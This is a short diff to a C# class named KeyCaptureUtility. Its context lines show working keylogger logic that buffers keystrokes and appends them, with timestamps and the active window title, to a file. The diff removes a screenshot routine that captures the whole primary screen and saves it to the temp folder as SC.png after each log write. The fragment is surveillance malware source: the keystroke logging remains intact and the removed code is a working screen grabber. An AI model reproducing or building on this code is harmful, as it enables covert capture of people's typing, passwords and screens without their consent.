@@ -139,9 +139,6 @@ public class KeyCaptureUtility
                 string message = timestamp + " : " + captureBuffer.ToString() + " [Active Window: " + activeWindowTitle + "]\r\n";
                 File.AppendAllText(filePath, message);
                 captureBuffer.Clear();  // Clear the input buffer after saving
-
-                // Take a screenshot and save it to the temp location
-                SaveScreenshot();
             }
 
             // Reset the stopwatch and continue checking
@@ -199,27 +196,6 @@ public class KeyCaptureUtility
         StringBuilder windowTitle = new StringBuilder(256);
         GetWindowText(hwnd, windowTitle, 256);
         return windowTitle.ToString();
-    }
-
-    // Method to capture and save a screenshot
-    public static void SaveScreenshot()
-    {
-        // Define the path to save the screenshot (temp directory)
-        string tempPath = Path.Combine(Path.GetTempPath(), "SC.png");
-
-        // Create a new bitmap with screen size
-        Rectangle bounds = Screen.PrimaryScreen.Bounds;
-        using (Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height))
-        {
-            using (Graphics g = Graphics.FromImage(screenshot))
-            {
-                // Capture the screen
-                g.CopyFromScreen(0, 0, 0, 0, bounds.Size);
-            }
-
-            // Save the screenshot as PNG
-            screenshot.Save(tempPath, ImageFormat.Png);
-        }
     }
 }
 
